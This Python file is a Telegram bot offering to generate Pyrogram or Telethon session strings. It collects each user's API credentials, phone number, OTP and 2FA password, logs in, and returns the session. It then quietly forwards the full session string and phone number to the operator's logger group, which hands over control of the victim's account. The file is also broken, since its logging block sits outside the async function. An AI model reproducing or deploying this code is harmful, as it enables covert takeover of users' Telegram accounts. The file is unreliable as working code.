import asyncio
import env
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    ApiIdInvalid,
)
from telethon import TelegramClient
from telethon.sessions import StringSession


# ================= LOG FUNCTION =================
async def send_log(bot, text):
    print("LOGGER_GROUP =", repr(env.LOGGER_GROUP))

    if not env.LOGGER_GROUP:
        print("LOGGER_GROUP is empty!")
        return

    try:
        await bot.send_message(
            chat_id=int(env.LOGGER_GROUP),
            text=text
        )
        print("✅ Logger message sent successfully.")
    except Exception as e:
        print(f"❌ Logger Error: {type(e).__name__}: {e}")


# ================= SESSION GENERATOR =================
async def generate_session(bot, msg, telethon=False):

    user_id = msg.chat.id

    await msg.reply("🚀 Session generation started...")

    # API_ID
    while True:
        api_id_msg = await bot.ask(user_id, "Send API_ID")

        if api_id_msg.text.isdigit():
            api_id = int(api_id_msg.text)
            break

        await msg.reply("❌ Invalid API_ID.")

    # API_HASH
    while True:
        api_hash_msg = await bot.ask(user_id, "Send API_HASH")

        api_hash = api_hash_msg.text.strip()

        if len(api_hash) > 10:
            break

        await msg.reply("❌ Invalid API_HASH.")

    # PHONE
    while True:
        phone = (await bot.ask(user_id, "📱 Send Phone Number")).text.strip()

        if phone.startswith("+"):
            break

        await msg.reply("❌ Invalid phone.")

    await msg.reply("📨 Sending OTP...")

    # Client
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    else:
        client = Client(
            "session_gen",
            api_id=api_id,
            api_hash=api_hash,
            in_memory=True,
        )

    await client.connect()

    # Send OTP
    if telethon:
        code = await client.send_code_request(phone)
    else:
        code = await client.send_code(phone)

    otp = (await bot.ask(user_id, "🔐 Send OTP")).text.replace(" ", "")

    try:
        if telethon:
            await client.sign_in(phone, otp)
        else:
            await client.sign_in(phone, code.phone_code_hash, otp)

    except SessionPasswordNeeded:
        password = (await bot.ask(user_id, "🔐 Send 2FA Password")).text

        if telethon:
            await client.sign_in(password=password)
        else:
            await client.check_password(password=password)

    session = (
        client.session.save()
        if telethon
        else await client.export_session_string()
    )

    await client.disconnect()

    await msg.reply(f"✅ SESSION GENERATED\n\n`{session}`")

    # ===== LOGGER =====
    # ================= LOG GROUP =================
if env.LOGGER_GROUP:
    try:
        print("LOGGER_GROUP =", repr(env.LOGGER_GROUP))

        await bot.send_message(
            chat_id=int(env.LOGGER_GROUP),
            text=(
                f"🔥 <b>NEW SESSION GENERATED</b>\n\n"
                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                f"📱 <b>Phone:</b> <code>{phone}</code>\n\n"
                f"<b>Session:</b>\n<code>{session}</code>"
            )
        )

        print("✅ Session sent to LOGGER_GROUP.")

    except Exception as e:
        print(f"❌ Logger Error: {type(e).__name__}: {e}")

# ================= SAFE LOG =================
await send_log(
    bot,
    f"✅ Session Generated\n"
    f"User ID: `{user_id}`\n"
    f"Phone: `{phone}`"
)
